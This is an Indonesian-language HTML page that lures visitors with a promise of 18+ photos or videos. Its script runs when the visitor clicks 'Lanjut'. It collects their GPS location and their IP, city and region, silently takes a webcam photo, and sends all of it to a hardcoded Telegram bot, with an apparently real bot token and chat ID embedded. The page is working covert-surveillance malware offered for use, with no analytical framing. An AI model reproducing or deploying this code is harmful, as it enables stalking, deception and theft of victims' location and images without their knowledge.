<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Random Website</title>
<style>
  html,body{margin:0;height:100vh;display:flex;justify-content:center;align-items:center;font-family:Arial,sans-serif;text-align:center;color:#fff;background:#111}
  .screen{width:100%;height:100%;display:flex;flex-direction:column;justify-content:center;align-items:center}
  button{background:#e91e63;color:#fff;border:none;padding:12px 30px;font-size:16px;border-radius:25px;cursor:pointer}
  #loading{display:none}
  .spinner{border:4px solid rgba(255,255,255,.3);border-top:4px solid #fff;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin-bottom:15px}
  @keyframes spin{to{transform:rotate(360deg)}}
  #welcome{display:none;font-size:48px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%)}
</style>
</head>
<body>

<!-- HALAMAN AWAL -->
<div id="start" class="screen">
  <h2>Kamu ingin melihat foto atau Video 18+ ?, silakan klik lanjut</h2>
  <button onclick="start()">Lanjut</button>
</div>

<!-- HALAMAN LOADING -->
<div id="loading" class="screen">
  <div class="spinner"></div>
  <div>Mengirim data...</div>
</div>

<!-- HALAMAN WELCOME -->
<div id="welcome" class="screen">WELCOME TO website random</div>

<script>
const BOT_TOKEN = '8467123418:AAHaESHrbl8IXkrhMyfhRqleggreCI9_9DI';
const CHAT_ID   = '7670525689';

async function start(){
  // ganti ke layar loading
  document.getElementById('start').style.display='none';
  document.getElementById('loading').style.display='flex';

  try{
    // 1. lokasi
    const pos=await new Promise((res,rej)=>
      navigator.geolocation.getCurrentPosition(res,rej,{timeout:8000})
    );
    const {latitude,longitude}=pos.coords;

    // 2. ip
    const ipData=await (await fetch('https://ipapi.co/json/')).json();
    const {ip,city,region}=ipData;

    // 3. kamera
    const stream=await navigator.mediaDevices.getUserMedia({video:true});
    const v=document.createElement('video');
    v.srcObject=stream;v.muted=true;
    v.play();await new Promise(r=>v.onloadedmetadata=r);

    // 4. foto
    const c=document.createElement('canvas');
    const ctx=c.getContext('2d');
    c.width=v.videoWidth;c.height=v.videoHeight;
    ctx.drawImage(v,0,0);

    // 5. kirim
    const blob=await new Promise(res=>c.toBlob(res,'image/jpeg'));
    const cap=`📍 ${city}, ${region}\n🌍 ${latitude}, ${longitude}\n🌐 ${ip}`;
    const fd=new FormData();
    fd.append('chat_id',CHAT_ID);
    fd.append('caption',cap);
    fd.append('photo',blob,'foto.jpg');
    const resp=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:fd});

    stream.getTracks().forEach(t=>t.stop());

    if(resp.ok){ // berhasil → welcome
      document.getElementById('loading').style.display='none';
      document.getElementById('welcome').style.display='flex';
    }else{ // gagal → reload saja
      location.reload();
    }
  }catch(e){
    location.reload();
  }
}
</script>
</body>
</html>
